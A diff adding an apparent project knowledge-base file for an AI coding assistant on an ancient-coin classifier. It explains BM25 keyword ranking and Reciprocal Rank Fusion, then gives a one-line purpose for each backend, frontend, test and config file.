+**BM25** (Best Match 25) is a keyword search ranking algorithm. It's the foundation of
+most search engines (including Elasticsearch's default).
+
+For a query "silver drachm Maroneia":
+1. Split into terms: ["silver", "drachm", "Maroneia"]
+2. For each document (coin description), score it:
+   - **TF (Term Frequency)**: how many times does "silver" appear in THIS document?
+     More occurrences = higher relevance, but with diminishing returns (BM25 saturates at ~3 occurrences)
+   - **IDF (Inverse Document Frequency)**: how rare is "silver" across ALL documents?
+     If "silver" appears in all 9,541 documents  not very discriminating  low weight.
+     If "Maroneia" appears in only 3 documents  very specific  high weight.
+   - Final score = sum of TFIDF for each query term
+
+BM25 is great at EXACT KEYWORD matches. Vector search is great at SEMANTIC matches.
+Example:
+- Query: "silver metal weight"  BM25 scores high for documents containing these exact words
+- Query: "argent precious metal"  Vector search matches (synonyms), BM25 misses (different words)
+
+The RAG engine's hybrid search runs BOTH, then merges rankings with RRF.
+
+---
+
+### What Is RRF (Reciprocal Rank Fusion)?
+
+**RRF** is a simple algorithm for combining two ranked lists into one.
+
+If you have:
+- BM25 ranking:       [Doc_A (rank 1), Doc_C (rank 2), Doc_B (rank 3)]
+- Vector ranking:     [Doc_B (rank 1), Doc_A (rank 2), Doc_D (rank 3)]
+
+RRF score for each document:
+```
+score(doc) = Σ  1 / (k + rank_r(doc))
+                where k=60 (constant), for each ranking r
+```
+
+For Doc_A: `1/(60+1) + 1/(60+2)` = `0.01639 + 0.01613` = **0.03252**
+For Doc_B: `1/(60+3) + 1/(60+1)` = `0.01587 + 0.01639` = **0.03226**
+For Doc_C: `1/(60+2) + 0` = **0.01613** (not in vector ranks at all)
+
+Final order: [Doc_A, Doc_B, Doc_C, Doc_D]
+
+Why k=60? It prevents top-ranked documents from completely dominating.
+Without k, rank 1 gets score 1.0 and rank 2 gets 0.5  a 2 gap.
+With k=60, rank 1 gets 1/61  0.0164 and rank 2 gets 1/62  0.0161  nearly equal.
+Results that appear near the top of BOTH lists win. A #1 in one list and #100 in the other
+loses to a #5 in both lists. This is the key insight of RRF.
+
+---
+
+## PART 9  Recap: How Every File Connects to Dhia's Work
+
+This is the summary for your engineering journal presentation. For each file, one sentence:
+what it is, and WHY it exists.
+
+```
+CORE ML FILES:
+src/data_pipeline/prep_engine.py    Converts raw Corpus Nummorum images to CLAHE-enhanced
+                                    299299 training inputs. Exists because the CNN cannot
+                                    learn from uncropped, unenhanced raw photos.
+
+src/core/dataset.py                 PyTorch Dataset class  the bridge between 7,677 JPEG
+                                    files on disk and batches of tensors the GPU consumes.
+                                    Exists because PyTorch's training loop needs lazy loading.
+
+src/core/model_factory.py           Defines the EfficientNet-B3 architecture with a custom
+                                    438-class head. Exists to set up the network every time
+                                    it's loaded (training OR inference).
+
+scripts/train.py                    The 729-line training loop  AMP, Mixup, Sampler, early
+                                    stopping. Ran ONCE for 103 minutes to produce best_model.pth.
+
+scripts/evaluate_tta.py             Measured the final test accuracy (80.03% with TTA).
+                                    Ran ONCE after training to benchmark the model.
+
+src/core/inference.py               Production wrapper around the trained model. Applies
+                                    CLAHE + auto-crop + 5 TTA passes to any input image.
+                                    Every classify request goes through this.
+
+KNOWLEDGE BASE:
+src/core/knowledge_base.py          Legacy ChromaDB wrapper (434 types). Kept as fallback.
+                                    NOT used in production  RAG engine replaced it.
+
+src/core/rag_engine.py              Production knowledge base: BM25 + ChromaDB vector search
+                                    + RRF over 47,705 chunks from 9,541 CN coin types.
+                                    Used by historian, validator, and investigator agents.
+
+scripts/build_knowledge_base.py     Scraped corpus-nummorum.eu at 1 req/sec to build the JSON.
+                                    Ran ONCE for 2 hours 41 minutes. --all-types flag added
+                                    to cover all 9,716 types.
+
+scripts/rebuild_chroma.py           Loaded all JSON records, chunked into 5 per coin, embedded
+                                    with all-MiniLM-L6-v2, inserted 47,705 vectors into ChromaDB.
+                                    Ran ONCE for 9 minutes.
+
+AGENT FILES:
+src/agents/gatekeeper.py            LangGraph state machine. Routes by confidence. Orchestrates
+                                    all other agents. The single entry point for classify requests.
+
+src/agents/historian.py             High-confidence path (>85%). Fetches 5 context blocks from
+                                    RAG, calls Gemini to write a grounded historical narrative.
+
+src/agents/validator.py             Mid-confidence path (40-85%). Checks if the CNN-predicted
+                                    metal type matches what OpenCV detects in the photo's HSV.
+
+src/agents/investigator.py          Low-confidence path (<40%). Uses VLM or OpenCV fallback
+                                    to extract visual attributes, then searches the full 9,541-type
+                                    KB for the closest matching coin types.
+
+src/agents/synthesis.py             Always runs last. Takes all agent results and renders a
+                                    professional PDF (fpdf2 direct draw, Greek transliteration).
+
+API FILES:
+src/api/main.py                     FastAPI application object. Sets up all middleware, routes,
+                                    health check, startup cleanup. The file Uvicorn loads.
+
+src/api/auth.py                     X-API-Key authentication. ONE dependency used by classify
+                                    and metrics routes to gate access.
+
+src/api/limiter.py                  slowapi rate limiter singleton. 10 classify requests/minute.
+                                    ONE instance shared by all routes.
+
+src/api/_store.py                   SQLite history repository. append/load_page/delete_by_id.
+                                    The only file that knows it's SQLite  everything else
+                                    just calls these functions.
+
+src/api/schemas.py                  Pydantic data contracts: ClassifyResponse, CnnResult, etc.
+                                    Defines exactly what shape the API returns. TypeScript's
+                                    types/api.ts must mirror these manually.
+
+src/api/routes/classify.py          POST /api/classify endpoint handler. Validates file,
+                                    runs gatekeeper pipeline, persists history, returns response.
+
+src/api/routes/history.py           GET /api/history, GET /api/history/{id}, DELETE /api/history/{id}.
+                                    Reads and deletes from SQLite via _store.py.
+
+src/api/logging_config.py           Configures JSON-formatted structured logging.
+                                    `LOG_FORMAT=json`  machine-readable logs for log aggregators.
+                                    `LOG_FORMAT=text` (default)  human-readable for development.
+
+FRONTEND FILES:
+frontend/app/layout.tsx             Root wrapper: sets up QueryClientProvider, nav bar, fonts.
+                                    Runs for every page, does not re-mount on navigation.
+
+frontend/app/page.tsx               Home page: CoinUploader + AgentPipeline + AnalysisPanel.
+                                    The main classify workflow.
+
+frontend/app/history/page.tsx       Paginated history list. URL-synced page number.
+                                    Client component inside Suspense wrapper.
+
+frontend/app/history/[id]/page.tsx  Single analysis detail page. Full ClassifyResponse displayed:
+                                    all 5 top matches, narrative, material check, PDF link,
+                                    CN external links, copy link button, stats strip.
+
+frontend/components/CoinUploader.tsx  File selection + drag-drop + quality check + upload
+                                    + AbortController + cancel button + canvas downsize.
+
+frontend/components/AgentPipeline.tsx  Fullscreen modal with 4 agent stations + mission control
+                                    log + particle beam connectors + X (cancel) button.
+
+frontend/components/AnalysisPanel.tsx  3-state CNN display (Identified/TTA Consensus/Deep Search)
+                                    + per-route sections + Framer Motion animated bars + CountUp.
+
+frontend/components/HistoryTable.tsx  Table with filter bar (search + route pills) + pagination
+                                    + delete button + CN external links. Client-side filtering
+                                    via useMemo.
+
+frontend/components/HealthDot.tsx   Polls GET /api/health every 30 seconds. Colored dot in nav.
+                                    Green=healthy, Red=degraded, Gray=connecting.
+
+frontend/lib/api.ts                 All HTTP calls to the backend. Two Axios instances:
+                                    classifyApiClient (direct port 8000) and apiClient (proxied).
+
+frontend/lib/store.ts               Zustand global state: phase, result, uploadProgress, _cancelFn.
+                                    Bridges CoinUploader  AgentPipeline  AnalysisPanel.
+
+frontend/lib/utils.ts               Exports cn() function. Merges Tailwind class strings safely.
+                                    Every component calls cn() for conditional class names.
+
+frontend/types/api.ts               TypeScript interfaces mirroring src/api/schemas.py.
+                                    ClassifyResponse, CnnResult, Top5Item, HistoryListResponse.
+                                    Must be kept in sync with schemas.py manually.
+
+TEST FILES:
+tests/unit/test_store.py            10 tests for _store.py. append, count, pagination,
+                                    ordering, get_by_id, delete_by_id. Uses temp SQLite file.
+
+tests/unit/test_api_security.py     16 tests for classify route's file validation:
+                                    _sanitise_filename and _detect_mime functions.
+
+tests/unit/test_auth.py             8 tests for auth.py: dev mode passthrough, correct key,
+                                    wrong key, missing key, HMAC timing safety.
+
+CONFIG FILES:
+models/best_model.pth               The trained EfficientNet-B3 weights. Epoch 52. The result
+                                    of 103 minutes of GPU computation.
+
+models/class_mapping.pth            Dict: class_to_idx (10150) and idx_to_class (01015).
+                                    Needed to convert CNN output index back to CN type ID.
+
+.env                                Secret keys (GITHUB_TOKEN, GOOGLE_API_KEY, DEEPCOIN_API_KEY).
+                                    NEVER committed to git. Listed in .gitignore.
+
+.env.example                        Template showing WHAT keys to set without showing values.
+                                    Safe to commit. Anyone cloning the repo sees what to fill in.
+
+requirements.txt                    Python dependencies with version pins. Run once:
+                                    pip install -r requirements.txt to get the full environment.
+
+pyproject.toml                      Tool configs: pytest markers, black line length, flake8 rules.
+                                    Also the build system config (though no wheel is built).
+
+Makefile                            Shortcuts: make api, make test, make lint, make train.
+                                    Translate complex commands into memorable targets.
+
+.github/copilot-instructions.md     THIS KNOWLEDGE BASE. Persists across Copilot sessions.
+                                    Updated after every major milestone.
+```
+
+---
